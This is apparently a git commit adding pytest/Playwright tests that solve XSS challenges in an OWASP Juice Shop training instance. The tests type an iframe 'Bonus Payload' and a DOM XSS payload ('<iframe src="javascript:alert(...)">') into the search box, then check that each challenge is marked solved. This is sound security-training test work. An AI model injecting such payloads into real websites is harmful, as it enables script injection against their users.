7a09ab6d0ad528e5184b8d505e93d398b825213f
Nick Tulett <nicktulett@gmail.com>
2025-06-20 21:43:59 +0100

    add xss tests

--- juice_shop.py
+++ juice_shop.py
@@ -3,21 +3,28 @@ import pytest
 
 class JuiceShop:
     base_url = "https://stc-owasp-juice-dnebatcgf2ddf4cr.uksouth-01.azurewebsites.net"
-    # privacy_policy = "privacy-security/privacy-policy"
-    # score_board = "score-board"
     pages = {
         "Privacy Policy": "privacy-security/privacy-policy",
         "Score Board": "score-board"
     }
+    search_button = "#searchQuery"
+    search_input = "app-mat-search-bar input"
 
     def __init__(self, page):
         self.page = page
 
     def open_shop(self):
         self.page.goto(f"{self.base_url}/#/")
+        self.page.get_by_text("Dismiss").click()
+        self.page.get_by_text("But me wait!").click()
 
     def open_page(self, page_name):
         self.page.goto(f"{self.base_url}/#/{self.pages[page_name]}")
+
+    def search_for(self, search_term):
+        self.page.locator(self.search_button).click()
+        self.page.locator(self.search_input).fill(search_term)
+        self.page.locator(self.search_input).press("Enter")
 
     def check_challenge_solved(self, challenge, api_request_context):
         challenge_statuses = api_request_context.get(f"/api/Challenges/?name={challenge}").json()
--- test_juice_shop.py
+++ test_juice_shop.py
@@ -27,5 +27,12 @@ def test_opening_hidden_pages(juice_shop, page_name, api_request_context):
     juice_shop.open_page(page_name)
     check.equal(True, juice_shop.check_challenge_solved(page_name, api_request_context))
 
+def test_injecting_payload(juice_shop, api_request_context):
+    juice_shop.open_shop()
+    juice_shop.search_for('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
+    check.equal(True, juice_shop.check_challenge_solved("Bonus Payload", api_request_context))
 
-
+def test_injecting_xss(juice_shop, api_request_context):
+    juice_shop.open_shop()
+    juice_shop.search_for('<iframe src="javascript:alert(`xss`)">')
+    check.equal(True, juice_shop.check_challenge_solved("DOM XSS", api_request_context))
